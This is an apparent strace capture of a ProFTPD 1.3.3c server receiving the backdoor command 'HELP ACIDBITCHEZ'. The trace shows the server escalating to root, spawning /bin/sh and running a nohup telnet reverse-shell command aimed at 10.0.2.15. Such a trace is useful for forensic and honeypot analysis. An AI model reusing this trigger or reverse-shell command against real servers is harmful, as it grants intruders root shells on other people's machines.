+4639  [080ebb56] fcntl64(6, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff52a38) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080eba4e] read(6, "", 612)       = 0
+4639  [080ee5d4] _llseek(6, 0, [16], SEEK_CUR) = 0
+4639  [080d314a] geteuid32()            = 65534
+4639  [080d316a] getegid32()            = 65534
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080ebaae] write(6, "\37\22\0\0\376\377\0\0\376\377\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080ebb56] fcntl64(6, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff52a38) = 0
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080ebb56] fcntl64(6, F_SETLKW64, {type=F_WRLCK, whence=SEEK_CUR, start=16, len=612}, 0x817de84) = 0
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080ebaae] write(6, "\37\22\0\0\376\377\0\0\376\377\0\0(none)\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080ebb56] fcntl64(6, F_SETLKW64, {type=F_UNLCK, whence=SEEK_CUR, start=16, len=612}, 0x817de84) = 0
+4639  [080ee5d4] _llseek(6, 0, [16], SEEK_CUR) = 0
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080ebb56] fcntl64(6, F_SETLKW64, {type=F_RDLCK, whence=SEEK_SET, start=0, len=0}, 0xbff52a58) = 0
+4639  [080eba4e] read(6, "\37\22\0\0\376\377\0\0\376\377\0\0(none)\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4639  [080ebb56] fcntl64(6, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529f8) = 0
+4639  [080ebb56] fcntl64(6, F_SETLKW64, {type=F_RDLCK, whence=SEEK_SET, start=0, len=0}, 0xbff52a58) = 0
+4639  [080eba4e] read(6, "", 612)       = 0
+4639  [080ebb56] fcntl64(6, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529f8) = 0
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4639  [080d2e1d] alarm(0)               = 300
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080d2e1d] alarm(300)             = 0
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080eb651] stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080ee80c] send(2, "<30>Aug  7 16:55:16 proftpd[4639"..., 104, 0) = 104
+4639  [080ee862] setsockopt(0, SOL_SOCKET, SO_OOBINLINE, [1], 4) = 0
+4639  [080ee862] setsockopt(1, SOL_SOCKET, SO_OOBINLINE, [1], 4) = 0
+4639  [080ebb56] fcntl64(0, F_SETOWN, 4639) = 0
+4639  [080ebb56] fcntl64(1, F_SETOWN, 4639) = 0
+4639  [080eca48] select(2, NULL, [1], NULL, {60, 0}) = 1 (out [1], left {59, 999997})
+4639  [080ebaae] write(1, "220 ProFTPD 1.3.3c Server (ProFT"..., 70) = 70
+4639  [080eca48] select(1, [0], NULL, NULL, {60, 0}) = 1 (in [0], left {59, 999998})
+4639  [080eba4e] read(0, "HELP ACIDBITCHEZ\r\n", 4102) = 18
+4639  [080d2e1d] alarm(0)               = 300
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080d2e1d] alarm(300)             = 0
+4639  [080d31a7] setuid32(0)            = 0
+4639  [080d3207] setgid32(0)            = 0
+4639  [080b5a7f] rt_sigaction(SIGINT, {SIG_IGN, [], 0}, {0x8048370, [INT], SA_RESTART}, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGQUIT, {SIG_IGN, [], 0}, {0x8048370, [QUIT], SA_RESTART}, 8) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+4639  [080bad3f] clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbff529a4) = 4641
+4639  [080d2dce] waitpid(4641,  <unfinished ...>
+4641  [080b5a7f] rt_sigaction(SIGINT, {0x8048370, [INT], SA_RESTART}, NULL, 8) = 0
+4641  [080b5a7f] rt_sigaction(SIGQUIT, {0x8048370, [QUIT], SA_RESTART}, NULL, 8) = 0
+4641  [080b5b99] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+4641  [080d30c4] execve("/bin/sh", ["sh", "-c", "/bin/sh;/sbin/sh"], [/* 16 vars */]) = 0
+4641  [007e8aad] brk(0)                 = 0x91ee000
+4641  [007e9cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4641  [007e9df3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78bf000
+4641  [007e9cb1] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+4641  [007e9b74] open("/etc/ld.so.cache", O_RDONLY) = 2
+4641  [007e9b3e] fstat64(2, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4641  [007e9df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 2, 0) = 0xb78b1000
+4641  [007e9bad] close(2)               = 0
+4641  [007e9cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4641  [007e9b74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 2
+4641  [007e9bf4] read(2, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
+4641  [007e9b3e] fstat64(2, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4641  [007e9df3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 2, 0) = 0x334000
+4641  [007e9e74] mprotect(0x487000, 4096, PROT_NONE) = 0
+4641  [007e9df3] mmap2(0x488000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 2, 0x153) = 0x488000
+4641  [007e9df3] mmap2(0x48b000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x48b000
+4641  [007e9bad] close(2)               = 0
+4641  [007e9df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78b0000
+4641  [007d5cdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb78b08d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4641  [007e9e74] mprotect(0x488000, 8192, PROT_READ) = 0
+4641  [007e9e74] mprotect(0x805c000, 4096, PROT_READ) = 0
+4641  [007e9e74] mprotect(0x7ef000, 4096, PROT_READ) = 0
+4641  [007e9e31] munmap(0xb78b1000, 56298) = 0
+4641  [00110422] getpid()               = 4641
+4641  [00110422] rt_sigaction(SIGCHLD, {SIG_DFL, [CHLD], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
+4641  [00110422] geteuid32()            = 0
+4641  [00110422] brk(0)                 = 0x91ee000
+4641  [00110422] brk(0x920f000)         = 0x920f000
+4641  [00110422] getppid()              = 4639
+4641  [00110422] getcwd("/", 4096)      = 2
+4641  [00110422] rt_sigaction(SIGINT, NULL, {SIG_DFL, [], 0}, 8) = 0
+4641  [00110422] rt_sigaction(SIGINT, {0x804f636, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4641  [00110422] rt_sigaction(SIGQUIT, NULL, {SIG_DFL, [], 0}, 8) = 0
+4641  [00110422] rt_sigaction(SIGQUIT, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4641  [00110422] rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
+4641  [00110422] rt_sigaction(SIGTERM, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4641  [00110422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb78b0938) = 4642
+4641  [00110422] wait4(-1,  <unfinished ...>
+4642  [00110422] execve("/bin/sh", ["/bin/sh"], [/* 17 vars */]) = 0
+4642  [00b3eaad] brk(0)                 = 0x8387000
+4642  [00b3fcb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4642  [00b3fdf3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb776c000
+4642  [00b3fcb1] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+4642  [00b3fb74] open("/etc/ld.so.cache", O_RDONLY) = 2
+4642  [00b3fb3e] fstat64(2, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4642  [00b3fdf3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 2, 0) = 0xb775e000
+4642  [00b3fbad] close(2)               = 0
+4642  [00b3fcb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4642  [00b3fb74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 2
+4642  [00b3fbf4] read(2, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
+4642  [00b3fb3e] fstat64(2, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4642  [00b3fdf3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 2, 0) = 0x110000
+4642  [00b3fe74] mprotect(0x263000, 4096, PROT_NONE) = 0
+4642  [00b3fdf3] mmap2(0x264000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 2, 0x153) = 0x264000
+4642  [00b3fdf3] mmap2(0x267000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x267000
+4642  [00b3fbad] close(2)               = 0
+4642  [00b3fdf3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775d000
+4642  [00b2bcdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb775d8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4642  [00b3fe74] mprotect(0x264000, 8192, PROT_READ) = 0
+4642  [00b3fe74] mprotect(0x805c000, 4096, PROT_READ) = 0
+4642  [00b3fe74] mprotect(0xb45000, 4096, PROT_READ) = 0
+4642  [00b3fe31] munmap(0xb775e000, 56298) = 0
+4642  [00b57422] getpid()               = 4642
+4642  [00b57422] rt_sigaction(SIGCHLD, {SIG_DFL, [CHLD], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
+4642  [00b57422] geteuid32()            = 0
+4642  [00b57422] brk(0)                 = 0x8387000
+4642  [00b57422] brk(0x83a8000)         = 0x83a8000
+4642  [00b57422] getppid()              = 4641
+4642  [00b57422] stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4642  [00b57422] stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4642  [00b57422] ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe03838) = -1 EINVAL (Invalid argument)
+4642  [00b57422] rt_sigaction(SIGINT, NULL, {SIG_DFL, [], 0}, 8) = 0
+4642  [00b57422] rt_sigaction(SIGINT, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4642  [00b57422] rt_sigaction(SIGQUIT, NULL, {SIG_DFL, [], 0}, 8) = 0
+4642  [00b57422] rt_sigaction(SIGQUIT, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4642  [00b57422] rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
+4642  [00b57422] rt_sigaction(SIGTERM, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4642  [00b57422] read(0,  <unfinished ...>
+4449  [080eca48] <... select resumed> ) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407444924
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407444924
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "\37\22\0\0\376\377\0\0\376\377\0\0(none)\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4449  [080b5c01] kill(4639, SIG_0)      = 0
+4449  [080d323d] getpgid(0x121f)        = 4449
+4449  [080ee5d4] _llseek(2, 0, [628], SEEK_CUR) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407444924
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0} <unfinished ...>
+4642  [00b57422] <... read resumed> "nohup sh -c '(sleep 4562|telnet "..., 8192) = 147
+4642  [00b57422] open("/dev/null", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666) = 2
+4642  [00b57422] fcntl64(1, F_DUPFD, 10) = 10
+4642  [00b57422] close(1)               = 0
+4642  [00b57422] fcntl64(10, F_SETFD, FD_CLOEXEC) = 0
+4642  [00b57422] dup2(2, 1)             = 1
+4642  [00b57422] close(2)               = 0
+4642  [00b57422] fcntl64(2, F_DUPFD, 10) = -1 EBADF (Bad file descriptor)
+4642  [00b57422] dup2(1, 2)             = 2
+4642  [00b57422] stat64("/usr/local/sbin/nohup", 0xbfe03770) = -1 ENOENT (No such file or directory)
+4642  [00b57422] stat64("/usr/local/bin/nohup", 0xbfe03770) = -1 ENOENT (No such file or directory)
+4642  [00b57422] stat64("/usr/sbin/nohup", 0xbfe03770) = -1 ENOENT (No such file or directory)
+4642  [00b57422] stat64("/usr/bin/nohup", {st_mode=S_IFREG|0755, st_size=34344, ...}) = 0
+4642  [00b57422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb775d938) = 4649
+4642  [00b57422] wait4(-1,  <unfinished ...>
+4649  [00b57422] execve("/usr/bin/nohup", ["nohup", "sh", "-c", "(sleep 4562|telnet -z 10.0.2.15 "...], [/* 17 vars */]) = 0
+4649  [00ddbaad] brk(0)                 = 0x88c1000
+4649  [00ddccb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4649  [00ddcdf3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7788000
+4649  [00ddccb1] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+4649  [00ddcb74] open("/etc/ld.so.cache", O_RDONLY) = 7
+4649  [00ddcb3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4649  [00ddcdf3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb777a000
+4649  [00ddcbad] close(7)               = 0
+4649  [00ddccb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4649  [00ddcb74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+4649  [00ddcbf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
+4649  [00ddcb3e] fstat64(7, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4649  [00ddcdf3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x15b000
+4649  [00ddce74] mprotect(0x2ae000, 4096, PROT_NONE) = 0
+4649  [00ddcdf3] mmap2(0x2af000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x153) = 0x2af000
+4649  [00ddcdf3] mmap2(0x2b2000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x2b2000
+4649  [00ddcbad] close(7)               = 0
+4649  [00ddcdf3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7779000
+4649  [00dc8cdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb77798d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4649  [00ddce74] mprotect(0x2af000, 8192, PROT_READ) = 0
+4649  [00ddce74] mprotect(0x804f000, 4096, PROT_READ) = 0
+4649  [00ddce74] mprotect(0xde2000, 4096, PROT_READ) = 0
+4649  [00ddce31] munmap(0xb777a000, 56298) = 0
+4649  [006a6422] brk(0)                 = 0x88c1000
+4649  [006a6422] brk(0x88e2000)         = 0x88e2000
+4649  [006a6422] open("/usr/lib/locale/locale-archive", O_RDONLY|O_LARGEFILE) = -1 ENOENT (No such file or directory)
+4649  [006a6422] open("/usr/share/locale/locale.alias", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=2570, ...}) = 0
+4649  [006a6422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7787000
+4649  [006a6422] read(7, "# Locale name alias data base.\n#"..., 4096) = 2570
+4649  [006a6422] read(7, "", 4096)      = 0
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] munmap(0xb7787000, 4096) = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_IDENTIFICATION", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=373, ...}) = 0
+4649  [006a6422] mmap2(NULL, 373, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7787000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/gconv/gconv-modules.cache", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=26048, ...}) = 0
+4649  [006a6422] mmap2(NULL, 26048, PROT_READ, MAP_SHARED, 7, 0) = 0xb7780000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_MEASUREMENT", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=23, ...}) = 0
+4649  [006a6422] mmap2(NULL, 23, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb777f000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_TELEPHONE", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=59, ...}) = 0
+4649  [006a6422] mmap2(NULL, 59, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb777e000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_ADDRESS", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=155, ...}) = 0
+4649  [006a6422] mmap2(NULL, 155, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb777d000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_NAME", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=77, ...}) = 0
+4649  [006a6422] mmap2(NULL, 77, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb777c000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_PAPER", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=34, ...}) = 0
+4649  [006a6422] mmap2(NULL, 34, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb777b000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_MESSAGES", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_MESSAGES/SYS_LC_MESSAGES", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=57, ...}) = 0
+4649  [006a6422] mmap2(NULL, 57, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb777a000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_MONETARY", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=286, ...}) = 0
+4649  [006a6422] mmap2(NULL, 286, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7778000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_COLLATE", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=1170770, ...}) = 0
+4649  [006a6422] mmap2(NULL, 1170770, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb765a000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_TIME", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=2454, ...}) = 0
+4649  [006a6422] mmap2(NULL, 2454, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7659000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_NUMERIC", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=54, ...}) = 0
+4649  [006a6422] mmap2(NULL, 54, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7658000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] open("/usr/lib/locale/en_US.utf8/LC_CTYPE", O_RDONLY) = 7
+4649  [006a6422] fstat64(7, {st_mode=S_IFREG|0644, st_size=256324, ...}) = 0
+4649  [006a6422] mmap2(NULL, 256324, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7619000
+4649  [006a6422] close(7)               = 0
+4649  [006a6422] ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbf7658) = -1 EINVAL (Invalid argument)
+4649  [006a6422] ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbf7658) = -1 ENOTTY (Inappropriate ioctl for device)
+4649  [006a6422] ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbf7658) = -1 ENOTTY (Inappropriate ioctl for device)
+4649  [006a6422] rt_sigaction(SIGHUP, {SIG_IGN, [HUP], SA_RESTART}, {SIG_IGN, [], 0}, 8) = 0
+4649  [006a6422] execve("/usr/local/sbin/sh", ["sh", "-c", "(sleep 4562|telnet -z 10.0.2.15 "...], [/* 17 vars */]) = -1 ENOENT (No such file or directory)
+4649  [006a6422] execve("/usr/local/bin/sh", ["sh", "-c", "(sleep 4562|telnet -z 10.0.2.15 "...], [/* 17 vars */]) = -1 ENOENT (No such file or directory)
+4649  [006a6422] execve("/usr/sbin/sh", ["sh", "-c", "(sleep 4562|telnet -z 10.0.2.15 "...], [/* 17 vars */]) = -1 ENOENT (No such file or directory)
+4649  [006a6422] execve("/usr/bin/sh", ["sh", "-c", "(sleep 4562|telnet -z 10.0.2.15 "...], [/* 17 vars */]) = -1 ENOENT (No such file or directory)
+4649  [006a6422] execve("/sbin/sh", ["sh", "-c", "(sleep 4562|telnet -z 10.0.2.15 "...], [/* 17 vars */]) = -1 ENOENT (No such file or directory)
+4649  [006a6422] execve("/bin/sh", ["sh", "-c", "(sleep 4562|telnet -z 10.0.2.15 "...], [/* 17 vars */]) = 0
+4649  [00c65aad] brk(0)                 = 0x96b9000
+4649  [00c66cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4649  [00c66df3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77b1000
+4649  [00c66cb1] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+4649  [00c66b74] open("/etc/ld.so.cache", O_RDONLY) = 7
+4649  [00c66b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4649  [00c66df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb77a3000
+4649  [00c66bad] close(7)               = 0
+4649  [00c66cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4649  [00c66b74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+4649  [00c66bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
